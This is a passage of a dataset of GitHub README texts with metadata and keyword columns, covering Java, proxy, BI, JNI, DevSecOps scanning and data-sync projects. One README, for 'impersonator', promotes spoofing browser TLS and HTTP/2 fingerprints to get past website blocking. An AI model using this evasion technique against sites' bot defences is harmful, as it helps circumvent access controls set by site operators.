",0,1,2,1.0,"['jafar', 'requirement', 'tl', 'dr', 'the', 'jafar', 'parser', 'usage']","['jafar', 'requirement', 'tl', 'dr', 'the']"
VIJAYWHAT/java-workshop,main,"# Java Workshop programs and Homework

This is for the co-students joined in the workshop
",0,0,1,1.0,"['java', 'workshop', 'program', 'homework']","['java', 'workshop', 'program', 'homework']"
ssquadteam/ApiaryProxy,main,"<img src=""apiary.png"" alt=""Apiary Logo"" align=""right"" width=""200"">
<div align=""center"">

## Apiary Proxy

[![Github Actions Build](https://img.shields.io/badge/BUILD-PASSING-green)](https://github.com/ssquadteam/Apiary/releases)

<h5>Apiary is a modernized <a href=""https://papermc.io/software/velocity"">Velocity</a> fork with all the necessary features for <a href=""https://discord.gg/themegahive"">The MegaHive</a></h5>
<h8>Logo designed by <a href=""https://minecraft.net/"">Mojang</a> duh</h8>
</div>

## Features
- **Modernized Codebase** to have an easily adaptable environment
 - **Necessary Server Commands in-built!** /alert /find /hub /ping /send, you name it!
 - **Extremely High Performance** to achieve the main goal for having thousands of players!

## Contact

- 📫 Discord: `iamcxv7`
- 📫 Support Server: `https://discord.gg/themegahive`


## Downloads

Pre-built Jars can be found in the [Releases Tab](https://github.com/ssquadteam/ApiaryProxy/releases)


## Building

Building a Server Jar for Distribution:

```bash
./gradlew build
```

Credits:
-------------
Thanks to these projects below. If these excellent projects hadn't appeared, Apiary would not have been so great.

- [Velocity-CTD](https://github.com/GemstoneGG/Velocity-CTD)
- [Velocity](https://github.com/PaperMC/Velocity)
",4,0,1,0.0,"['apiary', 'proxy', 'feature', 'contact', 'downloads', 'building']","['apiary', 'proxy', 'feature', 'contact', 'downloads']"
apache/maven-hocon-extension,main,"<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the ""License""); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an ""AS IS"" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
[Apache Maven Hocon Extension](https://maven.apache.org/extensions/maven-xinclude-extension/)
==================================

[![Apache License, Version 2.0, January 2004](https://img.shields.io/github/license/apache/maven.svg?label=License)](https://www.apache.org/licenses/LICENSE-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/org.apache.maven.extensions/maven-xinclude-extension.svg?label=Maven%20Central)](https://search.maven.org/artifact/org.apache.maven.extensions/maven-xinclude-extension)

This project provides a Hocon POM parser extension for Maven 4. It allows POMs to 
be written with the [Hocon](https://github.com/lightbend/config/blob/master/HOCON.md)
syntax, which is a superset of the [JSON](https://json.org/) syntax.

License
-------
This code is under the [Apache License, Version 2.0, January 2004][license].

See the [`NOTICE`](./NOTICE) file for required notices and attributions.

Usage
-----
To use this extension, the following declaration needs to be done in your `${rootDirectory}/.mvn/extensions.xml`:
```
<extensions xmlns=""http://maven.apache.org/EXTENSIONS/1.2.0"">
    <extension>
        <groupId>org.apache.maven.extensions</groupId>
        <artifactId>maven-hocon-extension</artifactId>
        <version>@project.version@</version>
    </extension>
</extensions>
```
This allows defining a POM using Hocon syntax:
```
modelVersion = 4.1.0
parent {
    groupId = org.apache.maven.hocon.its
    artifactId = parent
    version = 1.0.0-SNAPSHOT
}
artifactId = test

properties = {
  ""my.property"" = foo
  pluginVersion = 3.9
}

dependencies = [
    # just add one dummy dependency
    ""com.typesafe:config:1.4.2""
]
```
",0,0,3,2.0,"['add', 'one', 'dummy', 'dependency']","['add', 'one', 'dummy', 'dependency']"
zhkl0228/impersonator,master,"# impersonator

impersonator is a fork of [BouncyCastle-bctls](https://github.com/bcgit/bc-java/commit/74a62440c93342a6743bb33c36a5ee224fc6c885) and [okhttp](https://github.com/square/okhttp/tree/parent-4.12.0) that is designed to impersonate TLS fingerprints.

`impersonator` can
impersonate browsers' TLS/JA3 and HTTP/2 fingerprints. If you are blocked by some
website for no obvious reason, you can give `impersonator` a try.

## Features
- Supports TLS/JA3/JA4 fingerprints impersonation.
- Supports HTTP/2 fingerprints impersonation.

## Usage

TLS/JA3/JA4 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-bctls</artifactId>
    <version>1.0.7</version>
</dependency>
```

TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-okhttp</artifactId>
    <version>1.0.7</version>
</dependency>
```
- [src/test/java/com/github/zhkl0228/impersonator/IOSTest.java](https://github.com/zhkl0228/impersonator/blob/master/src/test/java/com/github/zhkl0228/impersonator/IOSTest.java)
```java
ImpersonatorApi api = ImpersonatorFactory.ios();
SSLContext context = api.newSSLContext(null, null); // for TLS/JA3/JA4 fingerprints impersonation

OkHttpClientFactory factory = OkHttpClientFactory.create(api);
OkHttpClient client = factory.newHttpClient(); // for TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```
",4,0,1,0.0,"['impersonator', 'feature', 'usage']","['impersonator', 'feature', 'usage']"
devjlkeesh/httpserver,main,"# Simple Todo HTTP Server in Java

This project is a simple HTTP server for managing todo items, built using Java's standard HttpServer API. It allows users to create, read, update, and delete (CRUD) todo items through a RESTful API.

## Features

- Create a new todo item
- Read all todo items or a specific item
- Update an existing todo item
- Delete a todo item

## Getting Started

### Prerequisites

- Java Development Kit (JDK) 8 or higher
- postgresql
- ```sql
  create database httpserver;
  
  create table if not exists todos(
    id bigserial primary key,
    title varchar not null,
    description varchar not null,
    user_id bigint not null,
    priority varchar not null default 'LOW',
    done boolean default 'f' not null,
    created_at timestamp not null default current_timestamp 
  );
    ```
---
# build jar

```shell
mvn clean package
cd target
java -jar httpserverexec.jar
```

---

## API

- reads all todos
```
GET localhost:8080/todo
```

-  reads todo which has id 1
```
GET localhost:8080/todo/1 
```

- create todo
```
POST localhost:8080/todo

Content-Type : application-json
{
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""user_id"":""User id which todo belongs to"",
    ""priority"":""HIGH""
}
```

- update todo
```
PUT localhost:8080/todo # update todo 

Content-Type : application-json
{
    ""id"":1,
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""priority"":""HIGH"",
    ""completed"":true
}
```",0,0,1,0.0,"['simple', 'todo', 'http', 'server', 'java', 'feature', 'get', 'start', 'prerequisite', 'build', 'jar', 'api', 'update', 'todo']","['todo', 'simple', 'http', 'server', 'java']"
datafor123/datafor-free,master,"# Datafor Visualization and Analysis

Datafor Visualization and Analysis is a self-service agile BI tool that provides intuitive and user-friendly data visualization and analysis capabilities to help users quickly explore, analyze, and make decisions with their data.

Datafor is developed based on [Pentaho BA Server Core](https://github.com/pentaho/pentaho-platform).


## Features

**Data Connectivity:** Supports connecting to various data sources, including relational databases, NoSQL databases, data warehouses, cloud data sources, and file data sources.

**Data Visualization:** Offers a rich variety of visual charts and elements with customization options, enabling users to easily create beautiful data analysis reports and data visualization pages.

**Multidimensional Analysis:** Provides powerful multidimensional analysis capabilities to help users delve into the patterns and relationships behind the data, uncovering potential business opportunities and issues.

**Embedded Analytics:** Supports embedding data visualization and analysis functions into other applications to achieve real-time data visualization and analysis.

## Screenshots

#### WYSIWYG Designer


<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/1%20visualizer.PNG""  />
</div>

#### Create multi-dimensional models in a few clicks

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/4%20modeler.png""  />
</div>

#### Interactive analysis report

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/demo2.gif""  width=""100%"" />
</div>

#### Cool visualization

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/5%20demo.PNG""  />
</div>

## Get Datafor

You can download Datafor(free edition) for the following platforms:

- [Linux](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-linux-6.06.zip)
- [Windows](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-windows-6.06.zip)

## Install Manual

- [CentOS](https://help.datafor.com.cn/docs/en/20%20setup/datafor-centos)
- [Ubuntu](https://help.datafor.com.cn/docs/en/20%20setup/datafor-ubuntu)
- [Windows](https://help.datafor.com.cn/docs/en/20%20setup/datafor-windows)
- [Docker](https://help.datafor.com.cn/docs/en/20%20setup/datafor-docker)

## Get Help

- For bug reports and feature requests, visit our [GitHub Issues](https://github.com/datafor123/datafor-free//issues) page.
- For general questions, email us at [support@datafor.com.cn](mailto:support@datafor.com.cn).
- Refer to the [help](https://help.datafor.com.cn/docs/en/) documentation for additional assistance.

## Free Edition V.S. Enterprise Edition

The Enterprise Edition offers significant advantages over the Free Edition, including support for more data sources, advanced analysis and visualization features, enhanced security, improved integration options, and optimized system performance.

<table>
  <tr>
    <th colspan=""2"" style=""width:40%;text-align:center;"">Features</th>
    <th style=""width:30%;text-align:center;"">Free Edition</th>
    <th style=""width:30%;text-align:center;"">Enterprise Edition</th>
  </tr>
  <tr>
    <td rowspan=""2"" style=""width:15%"">Data Sources</td>
    <td style=""width:25%"">Relational Databases</td>    
    <td align=""center"">MySQL, PostgreSQL, Oracle, MS SQL Server</td>
    <td align=""center"">Addition: GaussDB, Gaussdb2000, Greenplum, Tidb, Clickhouse, SparkSQL, Cloudera Impala, Snowflake, Impala, Hadoop Hive 2, Hana, InfluxDB, MongoDB,  Doris, Redshift</td>
  </tr>
  <tr>
    <td >File Upload (CSV, Excel)</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""5"">Analysis Models</td>
    <td>Multidimensional Modeling</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Masking</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Dictionary</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Calculated Fields</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">Visualization</td>
    <td>Charts</td>
    <td align=""center"">Pivot Table, Table, KPI Card, Dimension Field Information, Clustered Column Chart, Stacked Column Chart, 100% Stacked Column Chart, Clustered Bar Chart, Stacked Bar Chart, 100% Stacked Bar Chart, Line Chart, Column Line Chart, Pie Chart, Scatter Plot, Sunburst Chart, Gauge, Sankey</td>
    <td align=""center"">Addition：Parent-Child Tree Table, Hierarchical Tree Table, </td>
  </tr>
  <tr>
    <td>Maps</td>
    <td align=""center"">Filled GeoJson Map, Marker GeoJson Map, GIS Marker Map</td>
    <td align=""center"">Addition：Heat Map, Mapbox/AMap, Image Map</td>
  </tr>
  <tr>
    <td>Assists Components</td>
    <td align=""center"">Image File, Tabs, Text, SVG, Icon Fonts, Rectangle, Line, Ellipse, Hyperlink</td>
    <td align=""center"">Addition: Hyperlink</td>
  </tr>
  <tr>
    <td>Filter Components</td>
    <td align=""center"">Dropdown, List Box, Button, Radio/Checkbox, Date, Date Range, Timeline, Range Timeline, Numeric Range Filter</td>
    <td align=""center"">Addition: Pager, Search</td>
  </tr>
  <tr>
    <td>Custom Styles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Parameter Controller</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Mobile Layout</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Export to PDF, PNG, CSV, Excel</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""6"">Analysis</td>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-cross-filtering"" target=""_blank"">Cross-Model analytics</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/kzt-jmgnjs"" target=""_blank"">Drill Down</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Custom Events</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-Drill-through"" target=""_blank"">Drill Through</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-parameters"" target=""_blank"">Parameters</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""3"">Security</td>
    <td>File, Folder, and Analysis Model Access Control</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Row-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Object-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""7"">Integration and Embedding</td>
    <td>Single Sign-On</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Share Links</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>LDAP</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>CAS</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>JWT</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>WeChat</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>DingTalk</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">System</td>
    <td>Users and Roles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Report Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Analysis Model Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Lineage Analysis</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Log Auditing</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>ETL Scheduling (Integrated with Kettle)</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Backup and Restore</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Enterprise Data Portal</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""2"">Performance</td>
    <td>Pre-Aggregated Tables</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Query and Model Caching</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""4"">Support</td>
    <td>Help document</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Training</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Technical Support</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Customization</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
</table>


## Contact us

marketing@datafor.com.cn





",1,0,1,0.0,"['datafor', 'visualization', 'analysis', 'feature', 'screenshots', 'wysiwyg', 'designer', 'create', 'model', 'click', 'interactive', 'analysis', 'report', 'cool', 'visualization', 'get', 'datafor', 'install', 'manual', 'get', 'help', 'free', 'edition', 'enterprise', 'edition', 'contact', 'u']","['datafor', 'visualization', 'analysis', 'get', 'edition']"
hellyguo/rust_java_samples,main,"# rust-java samples

[Chinese version, 中文版](README_cn.md)

## desc

This repository contains sample `Rust` programs that call `Java` methods, and `Java` classes that call `Rust` methods.

## sample list

0. **sample000**, call `Rust` method from `Java`

   - [s000_hello.rs](sample/src/samples/s000_hello.rs)
   - [HelloWorld.java](sample4j/src/main/java/sample/s000/HelloWorld.java)

1. **sample001**, convert `Java` primitive types to bytes in `Rust`

   - [s001_bytes.rs](sample/src/samples/s001_bytes.rs)
   - [Bytes.java](sample4j/src/main/java/sample/s001/Bytes.java)

2. **sample002**, accept a `Java` object in `Rust`, and callback to `Java`

   - [s002_callback.rs](sample/src/samples/s002_callback.rs)
   - [Caller.java](sample4j/src/main/java/sample/s002/Caller.java)
   - [s002_callback_fast.rs](sample/src/samples/s002_callback_fast.rs)
   - [Caller2.java](sample4j/src/main/java/sample/s002/Caller2.java)

3. **sample003**, reverse `Java` bytes

   - [s003_reverse_bytes.rs](sample/src/samples/s003_reverse_bytes.rs)
   - [ReverseBytes.java](sample4j/src/main/java/sample/s003/ReverseBytes.java)

4. **sample004**, access `Java` DirectBuffer in `Rust`

   - [s004_direct_buf.rs](sample/src/samples/s004_direct_buf.rs)
   - [DirectBuf.java](sample4j/src/main/java/sample/s004/DirectBuf.java)

5. **sample005**, access `Java` primitive array in `Rust`

   - [s005_primitive_array.rs](sample/src/samples/s005_primitive_array.rs)
   - [PrimitiveArray.java](sample4j/src/main/java/sample/s005/PrimitiveArray.java)

6. **sample006**, create `Java` object in `Rust`

   - [s006_create_object.rs](sample/src/samples/s006_create_object.rs)
   - [ObjectCreator.java](sample4j/src/main/java/sample/s006/ObjectCreator.java)

7. **sample007**, set a field to `Java` object in `Rust`

   - [s007_fill_field.rs](sample/src/samples/s007_fill_field.rs)
   - [FieldFiller.java](sample4j/src/main/java/sample/s007/FieldFiller.java)

8. **sample008**, load `Java` class in `Rust`

   - [s008_load_class.rs](sample/src/samples/s008_load_class.rs)
   - [s008_class_buf.rs](sample/src/samples/s008_class_buf.rs)
   - [MemClassLoader.java](sample4j/src/main/java/sample/s008/MemClassLoader.java)

   > `s008_class_buf.rs` is generated by [java2u8vec.sh](shell/java2u8vec.sh)

9. **sample009**, register `Java` method dynamically in `Rust`

   - [s009_reg_method.rs](sample/src/samples/s009_reg_method.rs)
   - [NativeMethodRegister.java](sample4j/src/main/java/sample/s009/NativeMethodRegister.java)

[more ..](doc/sample_list.md)

## build

```shell
cargo build --release
```

`cargo` will generate `.so` in `target/release`, and call `build_java.sh` to build `.jar`, which contains `.so` in `resources` folder.

## how-to

1. call `Java` each JUnit test in IDE
2. call `Java` JUnit test suite in IDE

> **Note**: need to setup `JVM` args: `-DsampleLib=<path to lib>`

or

1. execute `Java` each JUnit test in console

    ```shell
    gradle test --tests HelloWorldTest
    ```

2. execute `Java` each JUnit test suite in console

    ```shell
    gradle test --tests SamplesSuite
    ```

The [JUnit report](sample4j/build/reports/tests/test/index.html) will be generated.

## thanks

Thanks to [metaworm](https://github.com/metaworm)([rust-java-demo](https://github.com/metaworm/rust-java-demo)). This article ([url1](https://zhuanlan.zhihu.com/p/568062165)/[url2](https://rustcc.cn/article?id=4ca84a67-d972-4460-912e-a297ec5edc0a)) is the most effective and detailed for learning how to call `JNI` through `Rust`.
",0,0,1,0.0,"['sample', 'desc', 'sample', 'list', 'build', 'thanks']","['sample', 'desc', 'list', 'build', 'thanks']"
Mixeway/Flow,main,"# Mixeway Flow

[![License](https://img.shields.io/badge/license-FlowLicense-blue.svg)](LICENSE.md)
![example workflow](https://github.com/mixeway/flow/actions/workflows/docker-build-backend.yml/badge.svg)
[![Discord](https://img.shields.io/discord/1272884200323944550)](https://discord.gg/76RY2Y82)
[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)](CONTRIBUTING.md)

## Introduction
![Mixeway Flow](.github/img/logo.png ""logo"")

**Mixeway Flow** is a versatile and comprehensive tool designed to serve as the ultimate Swiss army knife for DevSecOps processes. It streamlines the integration of security practices into your development and operations workflows, ensuring that your software is secure from the ground up.

Mixeway Flow comes equipped with built-in open-source scanning engines that perform thorough security validations across multiple layers of your development stack. From Infrastructure as Code (IaC) to source code and open-source libraries, Mixeway Flow ensures that potential vulnerabilities are identified and addressed early in the development lifecycle.

One of Mixeway Flow's standout features is its seamless integration with Git and CI/CD environments through webhooks. This means you don't have to spend time configuring and maintaining complex CI/CD pipelines—Mixeway Flow automatically hooks into your existing workflows to provide continuous security monitoring.

All vulnerabilities detected by Mixeway Flow are displayed in a single, unified dashboard. This dashboard offers a comprehensive view of all potential threats, with the added ability to suppress or ignore certain vulnerabilities based on specific contexts or justifications. This flexibility allows you to focus on the most critical issues without being overwhelmed by false positives or low-priority alerts.

Whether you are a developer, a security engineer, or part of a DevOps team, Mixeway Flow simplifies the integration of security into your development process, helping you build and maintain secure software with ease.

## How Mixeway Flow works

![Mixeway Process](.github/img/flow_process.jpg)

1. Register Git repository by entering repo URL and access token. At moment of initialization initial scan on last commit on default branch will be performed.
2. Configure WebHook on the GitLab or GitHub instance that will be triggered every time push or pull/merge request is detected. This trigger will send information to FLow to run the scan on the selected branch / commit or queue it if there are many events
3. Wait for the results and review detected threats

## Vulnerabilities and threats detection
![Mixeway Threats](.github/img/flow_scans.png)

Mixeway Flow has built in tools that verify security of given application across many layers. Each scan is performed in a transparent way from the CICD or developer perspective.

### SAST - engine: Bearer (https://github.com/Bearer/bearer)
> **SAST (Static Application Security Testing)** is a security technique that analyzes source code, bytecode, or binary code for vulnerabilities without executing the program. It identifies security flaws at the code level early in the development process, allowing developers to fix issues before the code is deployed. SAST scans are essential for detecting common vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure coding practices.

SAST scan is performed on the source code created and written by the team's developers looking for any places that might be a source for problems related with any type of injections or other threats.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### SCA - engine: SBOM & OWASP Dependency Track (https://github.com/DependencyTrack/dependency-track)
> **SCA (Software Composition Analysis)** is a security practice that identifies and manages vulnerabilities in open-source and third-party components within a software project. By analyzing the software's dependencies, SCA tools detect known vulnerabilities, license compliance issues, and outdated libraries. This helps ensure that the software remains secure and compliant with industry standards, especially when using external code that may introduce risks into the project.

Integrating SCA scanning into Your software development lifecycle help You properly manage dependencies You introduce to the codebase.

**Scan requirements**: In order to trigger SCA engine there has to be `sbom.json` file located in the root of the repository

### IAC - engine: KICS (https://github.com/Checkmarx/kics)
> **IaC (Infrastructure as Code)** vulnerability scanning is a security practice that involves analyzing IaC templates and configurations for security risks before infrastructure is provisioned. By scanning these templates, such as Terraform or CloudFormation scripts, IaC vulnerability scanning tools detect misconfigurations, insecure settings, and potential vulnerabilities that could expose infrastructure to attacks. This proactive approach helps secure cloud environments and infrastructure by identifying issues early in the development process.

This type of scan verify `Dockerfiles`, `terraform`, `kubernetes deployments` and much more configurations that can be deployed looking for the misconfiguration or bad practices to be alerted.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### Secret Leaks - engine: giteaks (https://github.com/gitleaks/gitleaks)
> **Secret leaks** refer to the unintentional exposure of sensitive information, such as API keys, passwords, tokens, and other credentials, in source code, configuration files, or logs. Detecting secret leaks is crucial, as exposed secrets can be exploited by attackers to gain unauthorized access to systems, services, or data. Secret scanning tools help identify and prevent the inclusion of sensitive information in public repositories or shared code, reducing the risk of security breaches.

Most severe incidents in the Public Cloud (but not only) occurred due to misconfigurations, hardcoded keys or keys accidentally pushed to the git repository. This kind of tests help You detect such problems and give You the timeframe needed to properly rotate leaked secrets.

**Scan requirements**: None. Scan is performed for every change without any conditions.

## Installation

- Prerequisites: access to docker hub, docker-compose command
- Hardware requirements: minimal 2CPU, 16GB ram 50GB disk space. Recommended: 4CPU, 32GB RAM 100 GB Disk space

### Option 1
```shell
git clone https://github.com/Mixeway/flow
cd flow
docker-compose up
```

### Option 2
```shell
cat <<EOF > docker-compose.yml
version: '3.8'

services:
  backend:
    image: mixeway/flow-api:latest
    container_name: flowapi_backend
    ports:
      - ""8888:8888""
      - ""8443:8443""
    environment:
      SSL: ""TRUE""
    volumes:
      - pki_data:/etc/pki
      - dependency_track_data:/root/.dependency-track
    depends_on:
      - flowdb

  flowdb:
    image: postgres:latest
    container_name: flowdb
    ports:
      - ""5432:5432""
    environment:
      POSTGRES_DB: flow
      POSTGRES_USER: flow_user
      POSTGRES_PASSWORD: flow_pass
    volumes:
      - flowdb_data:/var/lib/postgresql/data

  flow:
    image: mixeway/flow:latest
    container_name: flow_frontend
    ports:
      - ""443:443""
    volumes:
      - flow_data:/etc/nginx/ssl
    depends_on:
      - backend

volumes:
  flowdb_data:
  flow_data:
  pki_data:
  dependency_track_data:
EOF
docker-compose up
```

either way what will happen:
1. Postgres database will be set up
2. Backend will be set up, self-signed certificates will be generated, dependency track will be started
3. Frontend application will be started via nginx

application will be started at: `https://localhost:443`

initial password is: `admin:admin` - You will be forced to change it during first login

## Initial configuration

1. after login create a team
2. import the repository
3. register webhook
![webhook](.github/img/webhook.png)

Browse Detected vulnerabilities:
![webhook](.github/img/vulns.png)


## Documentation

> Under donstruction


## Roadmap

Features to be covered in the near future:
- SSO integration (OAuth, keycloak, gitlab login)
- BugTracking automated issues (gitlab issues, JIRA)
- Merge Request commenting with scanning results

Features to be covered in the further future:
- Integration with GitHub (the same scope as GitLab)
- Enhancing SCA engin with linking code repository with docker image in registry

---
",4,0,1,0.0,"['mixeway', 'flow', 'introduction', 'how', 'mixeway', 'flow', 'work', 'vulnerability', 'threat', 'detection', 'sast', 'engine', 'bearer', 'http', 'sca', 'engine', 'sbom', 'owasp', 'dependency', 'track', 'http', 'iac', 'engine', 'kics', 'http', 'secret', 'leak', 'engine', 'giteaks', 'http', 'installation', 'option', 'option', 'initial', 'configuration', 'documentation', 'roadmap']","['engine', 'http', 'mixeway', 'flow', 'option']"
syncliteio/SyncLite,main,"
<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_logo.png"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
  <p align=""center"">
    <a href=""https://www.synclite.io"">Learn more</a>
    ·
    <a href=""https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw"">Chat on Slack</a>
  </p>
</p>

# SyncLite - Build Anything Sync Anywhere

<a href=https://www.synclite.io>SyncLite</a> is an open-source, low-code, comprehensive relational data consolidation platform enabling developers to rapidly build data intensive applications for edge, desktop and mobile environments. SyncLite enables real-time, transactional data replication and consolidation from various sources including edge/desktop applications using popular embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL), data streaming applications, IoT message brokers, traditional database systems(ETL) and more into a diverse array of databases, data warehouses, and data lakes, enabling AI and ML use-cases at edge and cloud.

<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_Overview.png"" width=""80%"" height=""80%"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
</p>

SyncLite enables following scenarios for industry leading databases, data warehouse and data lakes.

## Build Sync-Ready Applications: 
SyncLite provides a novel CDC replication framework for embedded databases, helping developers quickly build data-intensive applications, including Gen AI Search and RAG applications, for edge, desktop, and mobile environments. It integrates seamlessly with popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL (HSQLDB), enabling Change Data Capture (CDC), transactional, real-time data replication, and consolidation into industry-leading databases, data warehouses, and data lakes. 

```SyncLite Logger```, an embeddable Java library (JDBC driver), captures all SQL transactions in log files that can be consumed by Java and Python applications for efficient data syncing.

```SyncLite DB```, a standalone sync-enabled database, accepting SQL requests in JSON format over HTTP, making it compatible with any programming language (Java, Python, C++, C#, Go, Rust, Ruby, Node.js etc.) and ideal for flexible, real-time data integration and consolidation, right from edge/desktop applications into final data destinations.
```

{Edge/Desktop Apps} + {SyncLite Logger + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Edge/Desktop Apps} ---> {SyncLite DB + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: 

https://www.synclite.io/synclite/sync-ready-apps

https://www.synclite.io/solutions/gen-ai-search-rag


## Build Streaming Applications For Last Mile Delivery: 
